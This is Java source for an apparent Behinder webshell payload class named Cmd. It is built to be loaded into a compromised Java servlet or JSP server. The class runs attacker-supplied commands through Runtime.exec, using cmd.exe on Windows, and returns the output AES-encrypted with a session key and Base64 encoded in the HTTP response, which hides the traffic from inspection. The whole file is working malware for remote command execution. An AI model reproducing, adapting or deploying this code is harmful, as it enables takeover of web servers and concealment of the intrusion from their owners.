package net.rebeyond.behinder.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Cmd {
    public static String cmd;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public Cmd() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        HashMap result = new HashMap();
        boolean var12 = false;

        ServletOutputStream so;
        label77:
        {
            try {
                var12 = true;
                result.put("msg", this.RunCMD(cmd));
                result.put("status", "success");
                var12 = false;
                break label77;
            } catch (Exception var16) {
                result.put("msg", var16.getMessage());
                result.put("status", "success");
                var12 = false;
            } finally {
                if (var12) {
                    try {
                        so = this.Response.getOutputStream();
                        so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                        so.flush();
                        so.close();
                        page.getOut().clear();
                    } catch (Exception var13) {
                        var13.printStackTrace();
                    }

                }
            }

            try {
                so = this.Response.getOutputStream();
                so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                so.flush();
                so.close();
                page.getOut().clear();
            } catch (Exception var14) {
                var14.printStackTrace();
            }

            return true;
        }

        try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception var15) {
            var15.printStackTrace();
        }

        return true;
    }

    private String RunCMD(String cmd) throws Exception {
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        String result = "";
        if (cmd != null && cmd.length() > 0) {
            Process p;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
            } else {
                p = Runtime.getRuntime().exec(cmd);
            }

            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));

            for (String disr = br.readLine(); disr != null; disr = br.readLine()) {
                result = result + disr + "\n";
            }

            result = new String(result.getBytes(osCharset));
        }

        return result;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");

        for (Object o : entity.keySet()) {
            String key = (String) o;
            sb.append("\"" + key + "\":\"");
            String value = ((String) entity.get(key));
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }
}
